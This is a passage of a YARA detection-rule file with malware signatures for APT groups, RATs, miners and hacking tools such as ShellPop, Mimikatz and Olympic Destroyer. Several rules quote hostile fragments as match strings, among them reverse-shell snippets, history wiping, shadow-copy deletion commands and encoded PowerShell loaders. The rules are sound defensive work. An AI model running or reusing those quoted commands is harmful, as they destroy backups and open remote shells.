      filesize < 800KB and 1 of them
}

rule APT_ME_BigBang_Mal_Jul18_1_RID2FCC : APT DEMO EXE FILE G1028 MAL MIDDLE_EAST {
   meta:
      description = "Detects malware from Big Bang report"
      author = "Florian Roth"
      reference = "https://research.checkpoint.com/apt-attack-middle-east-big-bang/"
      date = "2018-07-09 12:12:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "ac6462e9e26362f711783b9874d46fefce198c4c3ca947a5d4df7842a6c51224"
      hash2 = "e1f52ea30d25289f7a4a5c9d15be97c8a4dfe10eb68ac9d031edcc7275c23dbc"
      tags = "APT, DEMO, EXE, FILE, G1028, MAL, MIDDLE_EAST"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "%Y%m%d-%I-%M-%S" fullword ascii
      $s2 = "/api/serv/requests/%s/runfile/delete" fullword ascii
      $s3 = "\\part.txt" ascii
      $s4 = "\\ALL.txt" ascii
      $s5 = "\\sat.txt" ascii
      $s6 = "runfile.proccess_name" fullword ascii
      $s7 = "%s%s%p%s%zd%s%d%s%s%s%s%s" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 4 of them
}

rule PUA_LNX_XMRIG_CryptoMiner_RID3009 : DEMO FILE LINUX MAL xmrig {
   meta:
      description = "Detects XMRIG CryptoMiner software"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-06-28 12:22:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2023-01-06"
      hash1 = "10a72f9882fc0ca141e39277222a8d33aab7f7a4b524c109506a407cd10d738c"
      tags = "DEMO, FILE, LINUX, MAL, xmrig"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "number of hash blocks to process at a time (don't set or 0 enables automatic selection o" fullword ascii
      $s2 = "'h' hashrate, 'p' pause, 'r' resume, 'q' shutdown" fullword ascii
      $s3 = "* THREADS:      %d, %s, aes=%d, hf=%zu, %sdonate=%d%%" fullword ascii
      $s4 = ".nicehash.com" ascii
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 8000KB and ( 1 of ( $x* ) or 2 of them )
}

rule PLEAD_Downloader_Jun18_1_RID2F6A : DEMO EXE FILE MAL {
   meta:
      description = "Detects PLEAD Downloader"
      author = "Florian Roth"
      reference = "https://blog.jpcert.or.jp/2018/06/plead-downloader-used-by-blacktech.html"
      date = "2018-06-16 11:56:11"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "a26df4f62ada084a596bf0f603691bc9c02024be98abec4a9872f0ff0085f940"
      tags = "DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "%02d:%02d:%02d" ascii fullword
      $s2 = "%02d-%02d-%02d" ascii fullword
      $s3 = "1111%02d%02d%02d_%02d%02d2222" ascii fullword
      $a1 = "Scanning..." wide fullword
      $a2 = "Checking..." wide fullword
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( all of ( $s* ) or ( 2 of ( $s* ) and 1 of ( $a* ) ) )
}

rule APT_Lazarus_RAT_Jun18_2_RID2F03 : APT DEMO EXE FILE G0032 NK {
   meta:
      description = "Detects Lazarus Group RAT"
      author = "Florian Roth"
      reference = "https://twitter.com/DrunkBinary/status/1002587521073721346"
      date = "2018-06-01 11:39:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "e6096fb512a6d32a693491f24e67d772f7103805ad407dc37065cebd1962a547"
      tags = "APT, DEMO, EXE, FILE, G0032, NK"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "\\KB\\Release\\" ascii
      $s3 = "KB, Version 1.0" fullword wide
      $s4 = "TODO: (c) <Company name>.  All rights reserved." fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and 2 of them
}

rule MAL_ELF_VPNFilter_1_RID2D6A : APT DEMO FILE LINUX MAL {
   meta:
      description = "Detects VPNFilter malware"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-05-24 10:30:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "f8286e29faa67ec765ae0244862f6b7914fcdde10423f96595cb84ad5cc6b344"
      tags = "APT, DEMO, FILE, LINUX, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Login=" fullword ascii
      $s2 = "Password=" fullword ascii
      $s3 = "%s/rep_%u.bin" fullword ascii
      $s4 = "%s:%uh->%s:%hu" fullword ascii
      $s5 = "Password required" fullword ascii
      $s6 = "password=" fullword ascii
      $s7 = "Authorization: Basic" fullword ascii
      $s8 = "/tmUnblock.cgi" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 100KB and all of them
}

rule HKTL_shellpop_Perl_RID2DFC : DEMO HKTL SCRIPT {
   meta:
      description = "Detects Shellpop Perl script"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18 10:55:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "32c3e287969398a070adaad9b819ee9228174c9cb318d230331d33cda51314eb"
      tags = "DEMO, HKTL, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $ = "perl -e 'use IO::Socket::INET;$|=1;my ($s,$r);" ascii
      $ = ";STDIN->fdopen(\\$c,r);$~->fdopen(\\$c,w);s" ascii
   condition: 
      filesize < 2KB and 1 of them
}

rule HKTL_shellpop_Python_RID2EEB : DEMO HKTL SCRIPT T1059_006 T1070_003 {
   meta:
      description = "Detects malicious python shell"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18 11:35:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "aee1c9e45a1edb5e462522e266256f68313e2ff5956a55f0a84f33bc6baa980b"
      tags = "DEMO, HKTL, SCRIPT, T1059_006, T1070_003"
      minimum_yara = "3.5.0"
      
   strings:
      $ = "os.putenv('HISTFILE', '/dev/null');" ascii
   condition: 
      filesize < 2KB and 1 of them
}

rule HKTL_shellpop_Telnet_TCP_RID301B : DEMO HKTL SCRIPT {
   meta:
      description = "Detects malicious telnet shell"
      author = "Tobias Michalski"
      reference = "https://github.com/0x00-0x00/ShellPop"
      date = "2018-05-18 12:25:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "cf5232bae0364606361adafab32f19cf56764a9d3aef94890dda9f7fcd684a0e"
      tags = "DEMO, HKTL, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "if [ -e /tmp/f ]; then rm /tmp/f;" ascii
      $x2 = "0</tmp/f|/bin/bash 1>/tmp/f" fullword ascii
   condition: 
      filesize < 3KB and 1 of them
}

rule MAL_BurningUmbrella_Sample_2_RID31A5 : APT DEMO EXE FILE MAL {
   meta:
      description = "Detects malware sample from Burning Umbrella report"
      author = "Florian Roth"
      reference = "https://401trg.pw/burning-umbrella/"
      date = "2018-05-04 13:31:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "801a64a730fc8d80e17e59e93533c1455686ca778e6ba99cf6f1971a935eda4c"
      tags = "APT, DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = { 40 00 00 E0 63 68 72 6F 6D 67 75 78 } 
      $s2 = { 40 00 00 E0 77 62 68 75 74 66 6F 61 } 
      $s3 = "ActiveX Manager" wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and $s1 in ( 0 .. 1024 ) and $s2 in ( 0 .. 1024 ) and $s3
}

rule MAL_BurningUmbrella_Sample_3_RID31A6 : APT DEMO EXE FILE MAL {
   meta:
      description = "Detects malware sample from Burning Umbrella report"
      author = "Florian Roth"
      reference = "https://401trg.pw/burning-umbrella/"
      date = "2018-05-04 13:31:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "92efbecc24fbb5690708926b6221b241b10bdfe3dd0375d663b051283d0de30f"
      tags = "APT, DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "HKEY_CLASSES_ROOT\\Word.Document.8\\shell\\Open\\command" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 1 of them
}

rule MAL_BurningUmbrella_Sample_8_RID31AB : APT DEMO EXE FILE MAL {
   meta:
      description = "Detects malware sample from Burning Umbrella report"
      author = "Florian Roth"
      reference = "https://401trg.pw/burning-umbrella/"
      date = "2018-05-04 13:32:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "73270fe9bca94fead1b5b38ddf69fae6a42e574e3150d3e3ab369f5d37d93d88"
      tags = "APT, DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "cmd /c open %s" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 1 of them
}

rule MAL_BurningUmbrella_Sample_11_RID31D5 : APT DEMO FILE MAL {
   meta:
      description = "Detects malware sample from Burning Umbrella report"
      author = "Florian Roth"
      reference = "https://401trg.pw/burning-umbrella/"
      date = "2018-05-04 13:39:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "278e9d130678615d0fee4d7dd432f0dda6d52b0719649ee58cbdca097e997c3f"
      tags = "APT, DEMO, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Resume.app/Contents/Java/Resume.jarPK" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x4b50 and filesize < 700KB and 1 of them
}

rule MAL_BurningUmbrella_Sample_16_RID31DA : APT DEMO EXE FILE MAL {
   meta:
      description = "Detects malware sample from Burning Umbrella report"
      author = "Florian Roth"
      reference = "https://401trg.pw/burning-umbrella/"
      date = "2018-05-04 13:40:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "58bb3859e02b8483e9f84cc56fbd964486e056ef28e94dd0027d361383cc4f4a"
      tags = "APT, DEMO, EXE, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "http://netimo.net 0" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them
}

rule MAL_Winnti_Sample_May18_1_RID3003 : APT CHINA DEMO EXE FILE G0044 GEN MAL {
   meta:
      description = "Detects malware sample from Burning Umbrella report - Generic Winnti Rule"
      author = "Florian Roth"
      reference = "https://401trg.pw/burning-umbrella/"
      date = "2018-05-04 12:21:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "528d9eaaac67716e6b37dd562770190318c8766fa1b2f33c0974f7d5f6725d41"
      tags = "APT, CHINA, DEMO, EXE, FILE, G0044, GEN, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "wireshark" fullword wide
      $s2 = "procexp" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them
}

rule Lazagne_PW_Dumper_RID2DA5 : DEMO HKTL T1003 {
   meta:
      description = "Detects Lazagne PW Dumper"
      author = "Markus Neis, Florian Roth"
      reference = "https://github.com/AlessandroZ/LaZagne/releases/"
      date = "2018-03-22 10:40:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, T1003"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Crypto.Hash" fullword ascii
      $s2 = "laZagne" fullword ascii
      $s3 = "impacket.winregistry" fullword ascii
   condition: 
      3 of them
}

rule Chafer_Mimikatz_Custom_RID2FD9 : APT DEMO EXE FILE G0087 MIDDLE_EAST S0002 T1003 T1134_005 T1550_002 T1550_003 {
   meta:
      description = "Detects Custom Mimikatz Version"
      author = "Florian Roth, Markus Neis"
      reference = "https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018b.pdf"
      date = "2018-03-22 12:14:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9709afeb76532566ee3029ecffc76df970a60813bcac863080cc952ad512b023"
      tags = "APT, DEMO, EXE, FILE, G0087, MIDDLE_EAST, S0002, T1003, T1134_005, T1550_002, T1550_003"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "C:\\Users\\win7p\\Documents\\mi-back\\" ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of them
}

rule Chafer_Exploit_Copyright_2017_RID31DF : APT DEMO EXE EXPLOIT FILE G0049 G0087 MIDDLE_EAST {
   meta:
      description = "Detects Oilrig Internet Server Extension with Copyright (C) 2017 Exploit"
      author = "Markus Neis"
      reference = "https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018b.pdf"
      date = "2018-03-22 13:41:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "cdac69caad8891c5e1b8eabe598c869674dee30af448ce4e801a90eb79973c66"
      tags = "APT, DEMO, EXE, EXPLOIT, FILE, G0049, G0087, MIDDLE_EAST"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "test3 Internet Server Extension" fullword wide
      $x2 = "Copyright (C) 2017 Exploit" fullword wide
      $a1 = "popen() failed!" fullword ascii
      $a2 = "cmd2cmd=" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and ( 1 of ( $x* ) or all of ( $a* ) )
}

rule Oilrig_Myrtille_RID2D28 : APT DEMO EXE FILE G0049 MIDDLE_EAST T1021_001 {
   meta:
      description = "Detects Oilrig Myrtille RDP Browser"
      author = "Markus Neis"
      reference = "https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018b.pdf"
      date = "2018-03-22 10:19:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2022-12-21"
      hash1 = "67945f2e65a4a53e2339bd361652c6663fe25060888f18e681418e313d1292ca"
      tags = "APT, DEMO, EXE, FILE, G0049, MIDDLE_EAST, T1021_001"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "\\obj\\Release\\Myrtille.Services.pdb" ascii
      $x2 = "Failed to notify rdp client process exit (MyrtilleAppPool down?), remote session {0} ({1})" fullword wide
      $x3 = "Started rdp client process, remote session {0}" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and 1 of them
}

rule Impacket_Lateral_Movement_RID310D : DEMO EXE FILE HKTL {
   meta:
      description = "Detects Impacket Network Aktivity for Lateral Movement"
      author = "Markus Neis"
      reference = "https://github.com/CoreSecurity/impacket"
      date = "2018-03-22 13:06:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, EXE, FILE, HKTL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "impacket.dcerpc.v5.transport(" ascii
      $s2 = "impacket.smbconnection(" ascii
      $s3 = "impacket.dcerpc.v5.ndr(" ascii
      $s4 = "impacket.spnego(" ascii
      $s5 = "impacket.smb(" ascii
      $s6 = "impacket.ntlm(" ascii
      $s7 = "impacket.nmb(" ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 14000KB and 2 of them
}

rule TA18_074A_scripts_RID2CB1 : APT DEMO {
   meta:
      description = "Detects malware mentioned in TA18-074A"
      author = "Florian Roth"
      reference = "https://www.us-cert.gov/ncas/alerts/TA18-074A"
      date = "2018-03-16 10:00:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2022-08-18"
      hash1 = "2f159b71183a69928ba8f26b76772ec504aefeac71021b012bd006162e133731"
      tags = "APT, DEMO"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Running -s cmd /c query user on " ascii
   condition: 
      filesize < 600KB and 1 of them
}

rule APT15_Malware_Mar18_BS2005_RID2F27 : APT DEMO EXE FILE G0004 {
   meta:
      description = "Detects malware from APT 15 report by NCC Group"
      author = "Florian Roth"
      reference = "https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/march/apt15-is-alive-and-strong-an-analysis-of-royalcli-and-royaldns/"
      date = "2018-03-10 11:45:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      hash1 = "750d9eecd533f89b8aa13aeab173a1cf813b021b6824bc30e60f5db6fa7b950b"
      tags = "APT, DEMO, EXE, FILE, G0004"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "AAAAKQAASCMAABi+AABnhEBj8vep7VRoAEPRWLweGc0/eiDrXGajJXRxbXsTXAcZAABK4QAAPWwAACzWAAByrg==" fullword ascii
      $x2 = "AAAAKQAASCMAABi+AABnhKv3kXJJousn5YzkjGF46eE3G8ZGse4B9uoqJo8Q2oF0AABK4QAAPWwAACzWAAByrg==" fullword ascii
      $a1 = "http://%s/content.html?id=%s" fullword ascii
      $a2 = "http://%s/main.php?ssid=%s" fullword ascii
      $a3 = "http://%s/webmail.php?id=%s" fullword ascii
      $a9 = "http://%s/error.html?tab=%s" fullword ascii
      $s1 = "%s\\~tmp.txt" fullword ascii
      $s2 = "%s /C %s >>\"%s\" 2>&1" fullword ascii
      $s3 = "DisableFirstRunCustomize" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( 1 of ( $x* ) or 2 of them )
}

rule Slingshot_APT_Minisling_RID3019 : APT DEMO EXE FILE {
   meta:
      description = "Detects malware from Slingshot APT"
      author = "Florian Roth"
      reference = "https://securelist.com/apt-slingshot/84312/"
      date = "2018-03-09 12:25:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "{6D29520B-F138-442e-B29F-A4E7140F33DE}" fullword ascii wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of them
}

rule Slingshot_APT_Spork_Downloader_RID32EC : APT DEMO EXE FILE {
   meta:
      description = "Detects malware from Slingshot APT"
      author = "Florian Roth"
      reference = "https://securelist.com/apt-slingshot/84312/"
      date = "2018-03-09 14:25:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Usage: spork -c IP:PORT" fullword ascii wide
      $s2 = "connect-back IP address and port number" 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of them
}

rule Slingshot_APT_Ring0_Loader_RID30E5 : APT DEMO EXE FILE {
   meta:
      description = "Detects malware from Slingshot APT"
      author = "Florian Roth"
      reference = "https://securelist.com/apt-slingshot/84312/"
      date = "2018-03-09 12:59:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = " -> Missing element in DataDir -- cannot install" ascii
      $s2 = " -> Primary loader not present in the DataDir" ascii
      $s3 = "\\\\.\\amxpci" fullword ascii
      $s4 = " -> [Goad] ERROR in CreateFile:" fullword ascii
      $s5 = "\\\\.\\Sandra" fullword ascii
      $s6 = " -> [Sandra] RingZeroCode" fullword ascii
      $s7 = " -> [Sandra] Value from IOCTL_RDMSR:" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of them
}

rule Slingshot_APT_Malware_2_RID2FC9 : APT DEMO EXE FILE {
   meta:
      description = "Detects malware from Slingshot APT"
      author = "Florian Roth"
      reference = "https://securelist.com/apt-slingshot/84312/"
      date = "2018-03-09 12:12:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "2a51ef6d115daa648ddd57d1e4480f5a18daf40986bfde32aab19349aa010e67"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "\\\\?\\c:\\RECYCLER\\S-1-5-21-2225084468-623340172-1005306204-500\\INFO5" fullword wide
      $x_slingshot = { 09 46 BE 57 42 DD 70 35 5E } 
      $s1 = "Opening service %s for stop access failed.#" fullword wide
      $s2 = "LanMan setting <%s> is ignored because system has a higher value already." fullword wide
      $s3 = "\\DosDevices\\amxpci" wide
      $s4 = "lNTLMqSpPD" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 900KB and ( 1 of ( $x* ) or 4 of them )
}

rule Slingshot_APT_Malware_4_RID2FCB : APT DEMO EXE FILE {
   meta:
      description = "Detects malware from Slingshot APT"
      author = "Florian Roth"
      reference = "https://securelist.com/apt-slingshot/84312/"
      date = "2018-03-09 12:12:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "38c4f5320b03cbaf5c14997ea321507730a8c16906e5906cbf458139c91d5945"
      tags = "APT, DEMO, EXE, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Ss -a 4104 -s 257092 -o 8 -l 406016 -r 4096 -z 315440" fullword wide
      $s1 = "Slingshot" fullword ascii
      $s2 = "\\\\?\\e:\\$Recycle.Bin\\" wide
      $s3 = "LineRecs.reloc" fullword ascii
      $s4 = "EXITGNG" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( $x1 or 2 of them )
}

rule OpHoneybee_MaoCheng_Dropper_RID319B : APT C0006 DEMO EXE FILE G0072 T1569_002 {
   meta:
      description = "Detects MaoCheng dropper from Operation Honeybee"
      author = "Florian Roth"
      reference = "https://www.mcafee.com:443/blogs/"
      date = "2018-03-03 13:29:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      hash1 = "35904f482d37f5ce6034d6042bae207418e450f4"
      tags = "APT, C0006, DEMO, EXE, FILE, G0072, T1569_002"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "\\MaoCheng\\Release\\" ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 1 of them
}

rule MuddyWater_Mal_Doc_Feb18_1_RID306A : DEMO FILE G0069 MAL {
   meta:
      description = "Detects malicious document used by MuddyWater"
      author = "Florian Roth"
      reference = "Internal Research - TI2T"
      date = "2018-02-26 12:38:51"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3d96811de7419a8c090a671d001a85f2b1875243e5b38e6f927d9877d0ff9b0c"
      tags = "DEMO, FILE, G0069, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "aWV4KFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVuaWNvZGUuR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmco" ascii
      $x2 = "U1FCdUFIWUFid0JyQUdVQUxRQkZBSGdBY0FCeUFHVUFjd0J6QUdrQWJ3QnVBQ0FBS" 
   condition: 
      uint16 ( 0 ) == 0xcfd0 and filesize < 3000KB and 1 of them
}

rule Nanocore_RAT_Feb18_2_RID2DF2 : DEMO EXE FILE MAL NanocoreRAT {
   meta:
      description = "Detects Nanocore RAT"
      author = "Florian Roth"
      reference = "Internal Research - T2T"
      date = "2018-02-19 10:53:31"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "377ef8febfd8df1a57a7966043ff0c7b8f3973c2cf666136e6c04080bbf9881a"
      tags = "DEMO, EXE, FILE, MAL, NanocoreRAT"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "ResManagerRunnable" fullword ascii
      $s2 = "TransformRunnable" fullword ascii
      $s3 = "MethodInfoRunnable" fullword ascii
      $s4 = "ResRunnable" fullword ascii
      $s5 = "RunRunnable" fullword ascii
      $s6 = "AsmRunnable" fullword ascii
      $s7 = "ReadRunnable" fullword ascii
      $s8 = "ExitRunnable" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them
}

rule Destructive_Ransomware_Gen1_RID31CB : CRIME DEMO EXE FILE MAL RANSOM {
   meta:
      description = "Detects destructive malware"
      author = "Florian Roth"
      reference = "http://blog.talosintelligence.com/2018/02/olympic-destroyer.html"
      date = "2018-02-12 13:37:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "ae9a4e244a9b3c77d489dee8aeaf35a7c3ba31b210e76d81ef2e91790f052c85"
      tags = "CRIME, DEMO, EXE, FILE, MAL, RANSOM"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "/set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no" fullword wide
      $x2 = "delete shadows /all /quiet" fullword wide
      $x3 = "delete catalog -quiet" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them
}

rule GoldDragon_Aux_File_RID2E5E : APT CHINA CRIME DEMO {
   meta:
      description = "Detects export from Gold Dragon - February 2018"
      author = "Florian Roth"
      reference = "https://securingtomorrow.mcafee.com/mcafee-labs/gold-dragon-widens-olympics-malware-attacks-gains-permanent-presence-on-victims-systems/"
      date = "2018-02-03 11:11:31"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, CHINA, CRIME, DEMO"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "/////////////////////regkeyenum////////////" ascii
   condition: 
      filesize < 500KB and 1 of them
}

rule TopHat_BAT_RID2A97 : APT DEMO SCRIPT {
   meta:
      description = "Semiautomatically generated YARA rule - file cgen.bat"
      author = "Florian Roth"
      reference = "https://researchcenter.paloaltonetworks.com/2018/01/unit42-the-tophat-campaign-attacks-within-the-middle-east-region-using-popular-third-party-services/#appendix"
      date = "2018-01-29 07:03:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "f998271c4140caad13f0674a192093092e2a9f7794a7fbbdaa73ae8f2496c387"
      hash2 = "0fbc6fd653b971c8677aa17ecd2749200a4a563f9dd5409cfb26d320618db3e2"
      tags = "APT, DEMO, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "= New-Object IO.MemoryStream(,[Convert]::FromBase64String(\"" ascii
      $s2 = "goto Start" fullword ascii
      $s3 = ":Start" fullword ascii
   condition: 
      filesize < 5KB and all of them
}

rule Suckfly_Nidiran_Gen_1_RID2F1F : DEMO EXE FILE G0039 GEN MAL {
   meta:
      description = "Detects Suckfly Nidiran Trojan"
      author = "Florian Roth"
      reference = "https://www.symantec.com/connect/blogs/suckfly-revealing-secret-life-your-code-signing-certificates"
      date = "2018-01-28 11:43:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "ac7d7c676f58ebfa5def9b84553f00f283c61e4a310459178ea9e7164004e734"
      tags = "DEMO, EXE, FILE, G0039, GEN, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "WriteProcessMemory fail at %d " fullword ascii
      $s2 = "CreateRemoteThread fail at %d " fullword ascii
      $s3 = "CreateRemoteThread Succ" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them
}

rule MAL_MiniRAT_Gen_Jan18_1_RID2EA8 : DEMO EXE FILE GEN MAL {
   meta:
      description = "Detects Mini RAT malware inidcators"
      author = "Florian Roth"
      reference = "https://www.eff.org/deeplinks/2018/01/dark-caracal-good-news-and-bad-news"
      date = "2018-01-22 11:23:51"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2023-05-12"
      hash1 = "091ae8d5649c4e040d25550f2cdf7f1ddfc9c698e672318eb1ab6303aa1cf85b"
      hash2 = "b6ac374f79860ae99736aaa190cce5922a969ab060d7ae367dbfa094bfe4777d"
      hash3 = "ba4e063472a2559b4baa82d5272304a1cdae6968145c5ef221295c90e88458e2"
      tags = "DEMO, EXE, FILE, GEN, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "\\Mini rat\\" ascii
      $x2 = "\\Projects\\ali\\Clever Components v7\\" ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 7000KB and 1 of them
}

rule Turla_Mal_Script_Jan18_1_RID2FD7 : DEMO G0010 MAL RUSSIA SCRIPT T1059 {
   meta:
      description = "Detects Turla malicious script"
      author = "Florian Roth"
      reference = "https://ghostbin.com/paste/jsph7"
      date = "2018-01-19 12:14:21"
      score = 75
      customer = "demo"
